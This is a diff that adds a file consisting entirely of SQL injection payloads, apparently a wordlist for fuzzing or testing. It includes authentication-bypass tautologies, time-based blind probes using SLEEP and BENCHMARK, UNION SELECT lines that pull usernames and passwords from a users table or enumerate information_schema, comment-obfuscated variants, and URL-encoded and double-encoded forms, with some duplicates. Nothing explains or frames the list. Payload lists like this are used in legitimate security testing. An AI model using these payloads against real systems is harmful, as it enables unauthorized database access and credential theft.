@@ -1,0 +1,49 @@
+' OR '1'='1' --
+' OR 1=1 --
+' OR 'x'='x' --
+' OR 1=1# 
+' OR 1=1/* 
+' OR IF(1=1, SLEEP(5), 0) --
+' OR IF(1=2, SLEEP(5), 0) --
+' OR 1=1 AND SLEEP(5) --
+' OR 1=2 AND SLEEP(5) --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1, 2, 3 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' AND 1=1 --
+' AND 1=2 --
+' ' AND 1=1 --
+' ' AND 1=2 --
+' -- 
+' #
+' /* 
+'/**/OR/**/1=1--
+' OR 'a'='a' --
+' AND 1=1 --
+' AND 1=2 --
+' OR 1=1 --
+' AND 'a'='a' --
+' AND 'a'='b' --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT 1, 2, 3 --
+' UNION SELECT username, password FROM users --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+%27%20OR%20%271%27%3D%271%27%20--
+%27%20OR%201%3D1%20--
+%27%20OR%20%27x%27%3D%27x%27%20--
+%27%20OR%20%271%27%3D%271%27%20--
+' OR 1=1 --
+' OR 1=1 --
+' AND 1=1 --
+' OR '1'='1' --
+' Or '1'='1' --
+' oR '1'='1' --
+%27%20OR%20%271%27%3D%271%27%20--
+%2527%2520OR%25201%253D1%2520--
+'/*comment*/OR/*comment*/'1'='1'--
+' OR '1'='1' AND 'a'+'b'='ab'--
+' AND 1=1 --
+' || '1'='1' --
+' OR IF(1=1, SLEEP(5), 0)--
+' OR BENCHMARK(1000000, MD5('test'))--
